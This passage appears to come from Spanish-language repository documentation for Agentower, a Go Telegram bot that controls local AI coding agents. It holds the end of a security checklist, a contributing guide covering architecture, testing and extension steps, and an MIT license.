5. El puerto del agente activo (`AGENT_OPENCODE_PORT`, `AGENT_CLAUDE_PORT`,
   …) está libre y bindea solo a `127.0.0.1`.

Si tocas el código que aplica la invariante de workspace, añade un test
en `internal/usecase/workspace_browser_test.go` o en
`internal/usecase/bot_handler_init_test.go` que cubra el nuevo vector
de escape antes de pedir review.


---

# Contribuir

Gracias por el interés en Agentower.

## Flujo de trabajo

1. Crea una rama desde `main` con un nombre descriptivo:
   `feat/sessions-revert`, `fix/init-path-validation`, etc.
2. Antes de hacer push ejecuta siempre:
   ```bash
   go test -race ./...
   go vet ./...
   go build -o remote-bot ./cmd/remote-bot
   ```
   Si tocas el wrapper de Windows, comprueba además
   `.\windows\build.ps1` y `.\dist\Agentower.exe --selftest` (PowerShell).
3. Si tocas la capa de dominio (`internal/domain`), asegúrate de que
   sigue sin importar nada externo más allá de la librería estándar.
4. Abre un pull request describiendo el cambio y enlazando el comando
   o escenario que lo cubre.

## Estilo de código

- Go idiomático, `gofmt` sin cambios, `go vet` limpio.
- Logs vía `log/slog`. No introduzcas un segundo stack de logging (en
  concreto, no `log.Logger`).
- Sin comentarios obvios. Si el código necesita explicación, es
  candidato a refactor.
- Cero secretos en commits. El token del bot se lee del `.env` en
  tiempo de ejecución; no lo copies ni lo pegues en fixtures.

## Arquitectura en capas

El proyecto sigue hexagonal / clean architecture:

```text
internal/
  domain/      entidades y puertos (sin imports externos)
  usecase/     bot handler (acompañante), session watcher, workspace browser
  adapter/
    agents/
      opencode/    cliente REST + manager del subproceso
      claude/      stdio JSON contra `claude --print --output-format stream-json`
      kiro/        ACP contra `kiro-cli acp` + historial JSONL
      copilot/     ACP (CLI) / cliente LSP (bundle de VS Code)
      codex/       headless `codex exec --json -` + historial JSONL
      antigravity/ headless `agy --output-format stream-json` + transcript
      bundles.go   detección por SO (bundles/instaladores)
      detector.go  PATH + probing por plataforma
      registry.go  AgentRegistry + per-chat active pick
      process_*.go manejo de proceso por SO (unix/windows)
    telegram/  long polling, whitelist, callbacks
    storage/   repositorio SQLite (runtime_state, agent_state, completed_session)
    control/   servidor HTTP local para los wrappers (/state, /notify, /question-notify)
    workspace/ adaptador de filesystem
    config/      cargador de .env (AGENT_<KIND>_*)
cmd/remote-bot/ composition root (+ path_unix.go / path_windows.go)
macos/Agentower/   wrapper Swift (barra de menús) — opcional
windows/Agentower/ wrapper C#/.NET WinForms (área de notificación) — opcional
```

Las flechas de dependencia apuntan hacia adentro: el dominio no sabe
nada de Telegram ni de SQLite. Si necesitas algo externo en el dominio,
lo modelas como puerto (`internal/domain/ports.go`) y lo implementas en
un adapter.

## Añadir un comando nuevo de Telegram

Hay cuatro sitios que deben quedar en sincronía:

1. `internal/adapter/telegram/bot.go` → slice `commands` (registro del
   handler con whitelist).
2. `internal/adapter/telegram/bot.go` → método `registerCommands` (lo
   que Telegram muestra en el menú autocompletar).
3. `internal/usecase/bot_handler.go` → case en `HandleCommand` con la
   lógica.
4. `internal/usecase/` → test del flujo nuevo. Los tests construyen el
   `Handler` con `NewHandler(store, registry, serverManager, workspaceRoot)`
   y usan un `*fakeRegistry`/`*fakeServer` o un `httptest` para el agente
   (`bot_handler_e2e_test.go` es un buen ejemplo).

Si el comando requiere subcomandos parseados a mano, conviene centralizar
el parsing en una función pequeña y cubrir cada rama en el test.

## Añadir una variable de entorno nueva

1. Declara el campo en `internal/config/config.go` (`Config`).
2. Léela con `os.Getenv` en `Load()` con un valor por defecto seguro y
   validación (rangos numéricos, booleanos normalizados, etc.).
 3. Documenta la variable en:
   - la tabla "Variables opcionales" de `README.md`,
   - y, si aplica, la lista de "Variables de entorno sensibles" de
     `SECURITY.md`.
4. Pasa el valor al componente que lo necesite desde
   `cmd/remote-bot/main.go`.

## Añadir un endpoint nuevo a un agente

1. Añade el método al puerto `AgentAdapter` en
   `internal/domain/ports.go` (sólo si todavía no existe).
2. Implementa el método en el adapter concreto:
   `internal/adapter/agents/<kind>/` (opencode usa HTTP REST + manager;
   Claude/Kiro usan stdio JSON; Copilot usa LSP). Si el endpoint
   es un stream, usa un cliente HTTP sin timeout; si es una operación
   normal, usa el cliente con `Timeout`.
3. Marca la capacidad en el `scan<Agent>` del detector
   (`internal/adapter/agents/detector.go`) para que la UI de Telegram
   sepa qué botones renderizar.
4. Cubre con un test usando `httptest.NewServer` o un `fakebin` (mira
   `internal/adapter/agents/<kind>/client_test.go` como referencia).
5. Conéctalo en el caso del comando o flujo que corresponda en
   `internal/usecase/bot_handler.go`.

## Añadir un agente nuevo

1. Declara la constante `AgentKind` en
   `internal/domain/ports.go` y añádela a `AllAgentKinds()`.
2. Crea `internal/adapter/agents/<kind>/` con `client.go`,
   `manager.go` y un `testdata/fake<kind>.go` que hable el protocolo
   que el CLI exponga. Implementa `domain.AgentAdapter` (el compilador
   te obliga a través del `var _ domain.AgentAdapter = (*Adapter)(nil)`
   que ponemos en cada adapter).
3. Añade la capacidad por defecto en `scan<Kind>` dentro del
   `internal/adapter/agents/detector.go`.
4. Registra el adapter en `cmd/remote-bot/main.go` detrás de la guarda
   `hasDetected<Kind>(descriptors)` así un usuario sin el binario no ve
   un adapter roto.
5. Añade una entrada para el nuevo kind en **ambos wrappers** para que la
   sección **Agentes** del Settings lo muestre y lo detecte:
   - macOS: `ConfigStore.agentKinds` / `defaultPort(for:)` /
     `displayName(for:)` y `detectAgentsInPath()`.
   - Windows: `ConfigStore.AgentKinds` / `DefaultPort` / `DisplayName`
     y `AgentDetector.Detect()`.
   En el detector Go, añade la ruta por SO en
   `internal/adapter/agents/bundles.go`.
6. Si el agente expone un endpoint HTTP en localhost, documéntalo en
   `SECURITY.md` para mantener la superficie de ataque al día.

## Tocar el modelo de seguridad

Si tu cambio afecta a la whitelist, a la validación del workspace o al
manejo del token:

1. Escribe primero el test que cubre el vector de ataque que cierras
   (o el que impides romper).
2. Cambia el código en `WorkspaceBrowser.resolve` o donde aplique.
3. Verifica que `bot_handler_init_test.go` y
   `workspace_browser_test.go` siguen pasando — son la red de seguridad
   de la invariante "stay inside root".
4. Documenta el cambio en `SECURITY.md`.

## Tests

- `go test -race ./...` debe pasar siempre. Hay componentes con estado
  compartido (manager de OpenCode, SQLite con `MaxOpenConns(1)`) y los
  races salen rápido con el detector.
- Cobertura mínima esperada por capa:
  - `internal/usecase/`: 40% o más (los flujos de seguridad viven
    aquí).
  - `internal/adapter/`: cobertura > 60% cuando el adapter tenga
    lógica no trivial.
- Para el adapter de Telegram, los tests unitarios llegan hasta donde
  llega `telebot.v3` mockeando el endpoint HTTP (`bot_test.go`).

## Releasing

- Etiqueta el commit en `main` con versionado semver:
  `git tag v0.x.y`.
- No publiques binarios firmados; los usuarios compilan con
  `go build -o remote-bot ./cmd/remote-bot`, `make app` (macOS) o
  `.\windows\build.ps1` (Windows).
- Tras etiquetar, actualiza `docs/PRODUCT.md` (sección "Implemented" u
  "Open task list" según corresponda), `README.md` si hay nuevos
  comandos o variables, y el `AGENTS.md`/`docs` si cambia la
  arquitectura de los wrappers.


---

MIT License

Copyright (c) 2026 Gregory Oviedo

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
